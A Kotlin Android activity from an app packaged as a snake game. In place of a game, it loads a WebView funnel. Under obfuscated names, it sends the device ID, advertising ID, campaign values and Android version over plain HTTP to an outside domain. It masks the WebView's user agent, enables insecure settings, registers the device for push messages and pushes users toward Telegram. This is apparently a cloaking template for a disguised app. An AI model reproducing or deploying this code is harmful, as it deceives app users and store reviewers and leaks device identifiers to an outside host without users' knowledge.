package com.snake.io.slither.w

import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import android.provider.MediaStore
import android.webkit.*
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerLib
import com.google.android.material.snackbar.Snackbar
import com.onesignal.OneSignal
import com.snake.io.slither.w.MaaaainClas.Companion.C1efgrth
import com.snake.io.slither.w.MaaaainClas.Companion.D1efrgt
import com.snake.io.slither.w.MaaaainClas.Companion.MAIN_IDdfrgth
import com.snake.io.slither.w.databinding.ActivityStrangeWebBinding
import org.json.JSONException
import org.json.JSONObject
import java.io.File
import java.io.IOException

class StrangeWebActivity : AppCompatActivity() {



    lateinit var fegrthyj: WebView
    var fgrhj: ValueCallback<Array<Uri>>? = null
    var fgrthyjujuj: String? = null

    private val JJJJJJJJHGTFFTF = 1
    lateinit var fggythyhybb: ActivityStrangeWebBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        fggythyhybb = ActivityStrangeWebBinding.inflate(layoutInflater)
        setContentView(fggythyhybb.root)
        fegrthyj = fggythyhybb.frgthyhyviewWeb
        Snackbar.make(
            fggythyhybb.root, "Loading...",
            Snackbar.LENGTH_LONG
        ).show()

        val cookieManagerfergtyh = CookieManager.getInstance()
        cookieManagerfergtyh.setAcceptCookie(true)
        cookieManagerfergtyh.setAcceptThirdPartyCookies(fegrthyj, true)
        webSettingsSSSdefr()
        val activityfegrgtt: Activity = this

        fegrthyj.webViewClient = object : WebViewClient() {


            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                try {
                    if (URLUtil.isNetworkUrl(url)) {
                        return false
                    }
                    if (appInstalledOrNot(url)) {

                        val intent = Intent(Intent.ACTION_VIEW)
                        intent.data = Uri.parse(url)
                        startActivity(intent)
                    } else {

                        Toast.makeText(
                            applicationContext,
                            "Application is not installed",
                            Toast.LENGTH_LONG
                        ).show()
                        startActivity(
                            Intent(
                                Intent.ACTION_VIEW,
                                Uri.parse("https://play.google.com/store/apps/details?id=org.telegram.messenger")
                            )
                        )
                    }
                    return true
                } catch (e: Exception) {
                    return false
                }
                view.loadUrl(url)
            }


            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                saveUrl(url)
            }

            override fun onReceivedError(
                view: WebView,
                errorCode: Int,
                description: String,
                failingUrl: String
            ) {
                Toast.makeText(activityfegrgtt, description, Toast.LENGTH_SHORT).show()
            }


        }
        fegrthyj.webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                webView: WebView, filePathCallback: ValueCallback<Array<Uri>>,
                fileChooserParams: FileChooserParams
            ): Boolean {
                fgrhj?.onReceiveValue(null)
                fgrhj = filePathCallback
                var takePictureIntentfrgtgyhy: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
                if (takePictureIntentfrgtgyhy!!.resolveActivity(packageManager) != null) {


                    var frthyhujujkiphotoFile: File? = null
                    try {
                        frthyhujujkiphotoFile = createImageFileftgyhy()
                        takePictureIntentfrgtgyhy.putExtra("PhotoPath", fgrthyjujuj)
                    } catch (ex: IOException) {

                    }


                    if (frthyhujujkiphotoFile != null) {
                        fgrthyjujuj = "file:" + frthyhujujkiphotoFile.absolutePath
                        takePictureIntentfrgtgyhy.putExtra(
                            MediaStore.EXTRA_OUTPUT,
                            Uri.fromFile(frthyhujujkiphotoFile)
                        )
                    } else {
                        takePictureIntentfrgtgyhy = null
                    }
                }
                val gtyhyyhyhuju = Intent(Intent.ACTION_GET_CONTENT)
                gtyhyyhyhuju.addCategory(Intent.CATEGORY_OPENABLE)
                gtyhyyhyhuju.type = "image/*"
                val tghjkikol: Array<Intent?> =
                    takePictureIntentfrgtgyhy?.let { arrayOf(it) } ?: arrayOfNulls(0)
                val chooserIntenttgyhyhy = Intent(Intent.ACTION_CHOOSER)
                chooserIntenttgyhyhy.putExtra(Intent.EXTRA_INTENT, gtyhyyhyhuju)
                chooserIntenttgyhyhy.putExtra(Intent.EXTRA_TITLE, getString(R.string.image_pic_choose))
                chooserIntenttgyhyhy.putExtra(Intent.EXTRA_INITIAL_INTENTS, tghjkikol)
                startActivityForResult(
                    chooserIntenttgyhyhy, JJJJJJJJHGTFFTF
                )
                return true
            }

            @Throws(IOException::class)
            private fun createImageFileftgyhy(): File {
                var imageStorageDirfrrf = File(
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                    "DirectoryNameHere"
                )
                if (!imageStorageDirfrrf.exists()) {
                    imageStorageDirfrrf.mkdirs()
                }

                imageStorageDirfrrf =
                    File(imageStorageDirfrrf.toString() + File.separator + "IMG_" + System.currentTimeMillis() + ".jpg")
                return imageStorageDirfrrf
            }

        }

        fegrthyj.loadUrl(dfrgfthyhugetUrl())
    }


    private fun deftgFrfpushToOneSignal(string: String) {

        OneSignal.setExternalUserId(
            string,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(results: JSONObject) {
                    try {
                        if (results.has("push") && results.getJSONObject("push").has("success")) {
                            val isPushSuccessftgtgyh = results.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $isPushSuccessftgtgyh"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("email") && results.getJSONObject("email").has("success")) {
                            val dfrgtDeisEmailSuccess =
                                results.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $dfrgtDeisEmailSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("sms") && results.getJSONObject("sms").has("success")) {
                            val isSmsSuccessdefE = results.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $isSmsSuccessdefE"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }

                override fun onFailure(error: OneSignal.ExternalIdError) {
                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }

    private fun webSettingsSSSdefr() {
        val webSettingssderftrgthy = fegrthyj.settings
        webSettingssderftrgthy.javaScriptEnabled = true

        webSettingssderftrgthy.useWideViewPort = true

        webSettingssderftrgthy.loadWithOverviewMode = true
        webSettingssderftrgthy.allowFileAccess = true
        webSettingssderftrgthy.domStorageEnabled = true
        webSettingssderftrgthy.userAgentString = webSettingssderftrgthy.userAgentString.replace("; wv", "")

        webSettingssderftrgthy.javaScriptCanOpenWindowsAutomatically = true
        webSettingssderftrgthy.setSupportMultipleWindows(false)

        webSettingssderftrgthy.displayZoomControls = false
        webSettingssderftrgthy.builtInZoomControls = true
        webSettingssderftrgthy.setSupportZoom(true)

        webSettingssderftrgthy.pluginState = WebSettings.PluginState.ON
        webSettingssderftrgthy.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        webSettingssderftrgthy.setAppCacheEnabled(true)

        webSettingssderftrgthy.allowContentAccess = true
    }

    private fun appInstalledOrNot(uri: String): Boolean {

        val pmaaaaaanager = packageManager
        try {

            pmaaaaaanager.getPackageInfo("org.telegram.messenger", PackageManager.GET_ACTIVITIES)


            return true
        } catch (e: PackageManager.NameNotFoundException) {

        }
        return false
    }

    private fun dfrgfthyhugetUrl(): String {

        val faaaaaaaaaakspoon = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)

        val jjjjjjjjjsharPref = getSharedPreferences("SP", MODE_PRIVATE)

        val cpOnefrgtg: String? = jjjjjjjjjsharPref.getString(C1efgrth, "null")
        val frgttdpOne: String? = jjjjjjjjjsharPref.getString(D1efrgt, "null")
        val gggggggggggthy: String? = jjjjjjjjjsharPref.getString(MAIN_IDdfrgth, null)

        val packfrgthgyhy = "com.snake.io.slither.w"

        val dddddddddddddddddid = AppsFlyerLib.getInstance().getAppsFlyerUID(this)


        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        val one__ = "sub_id_1="
        val ____two = "deviceID="
        val threefrgtyghy = "ad_id="
        val fourgthy = "sub_id_4="
        val fivefgrth = "sub_id_5="
        val sixfrgtyh = "sub_id_6="


        val firstfghyy = "http://"
        val frgtyhsecond = "divinequeen.xyz/go.php?to=2&"

        val nananana = "naming"
        val llllnulll = "deeporg"

        val androidVersionfrgtyh = Build.VERSION.RELEASE

        val resultABfrftrgtgt = firstfghyy + frgtyhsecond

        var frgythytttyyuuukuijiafter = ""
        if (cpOnefrgtg != "null") {
            frgythytttyyuuukuijiafter =
                "$resultABfrftrgtgt$one__$cpOnefrgtg&$____two$dddddddddddddddddid&$threefrgtyghy$gggggggggggthy&$fourgthy$packfrgthgyhy&$fivefgrth$androidVersionfrgtyh&$sixfrgtyh$nananana"
        } else {
            frgythytttyyuuukuijiafter =
                "$resultABfrftrgtgt$one__$frgttdpOne&$____two$dddddddddddddddddid&$threefrgtyghy$gggggggggggthy&$fourgthy$packfrgthgyhy&$fivefgrth$androidVersionfrgtyh&$sixfrgtyh$llllnulll"
        }
        deftgFrfpushToOneSignal(dddddddddddddddddid.toString())
        return faaaaaaaaaakspoon.getString("SAVED_URL", frgythytttyyuuukuijiafter).toString()
    }




    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode != JJJJJJJJHGTFFTF || fgrhj == null) {
            super.onActivityResult(requestCode, resultCode, data)
            return
        }
        var resultsDRFRKFOOR: Array<Uri>? = null

        if (resultCode == AppCompatActivity.RESULT_OK) {
            if (data == null || data.data == null) {
                resultsDRFRKFOOR = arrayOf(Uri.parse(fgrthyjujuj))
            } else {
                val dataStringfrFRFR = data.dataString
                if (dataStringfrFRFR != null) {
                    resultsDRFRKFOOR = arrayOf(Uri.parse(dataStringfrFRFR))
                }
            }
        }
        fgrhj?.onReceiveValue(resultsDRFRKFOOR)
        fgrhj = null
    }

    fun saveUrl(url: String?) {
        if (!url!!.contains("t.me")) {

            if (firstUrldfrgtggtg4555 == "") {
                firstUrldfrgtggtg4555 = getSharedPreferences(
                    "SP_WEBVIEW_PREFS",
                    AppCompatActivity.MODE_PRIVATE
                ).getString(
                    "SAVED_URL",
                    url
                ).toString()

                val spdfrgtt = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
                val DEDEFrftgt = spdfrgtt.edit()
                DEDEFrftgt.putString("SAVED_URL", url)
                DEDEFrftgt.apply()
            }
        }
    }


    private var rfgtgyhydoubleBackToExitPressedOnce = false
    override fun onBackPressed() {


        if (fegrthyj.canGoBack()) {
            if (rfgtgyhydoubleBackToExitPressedOnce) {
                fegrthyj.stopLoading()
                fegrthyj.loadUrl(firstUrldfrgtggtg4555)
            }
            this.rfgtgyhydoubleBackToExitPressedOnce = true
            fegrthyj.goBack()
            Handler(Looper.getMainLooper()).postDelayed(Runnable {
                rfgtgyhydoubleBackToExitPressedOnce = false
            }, 2000)

        } else {
            super.onBackPressed()
        }
    }

    var firstUrldfrgtggtg4555 = ""

}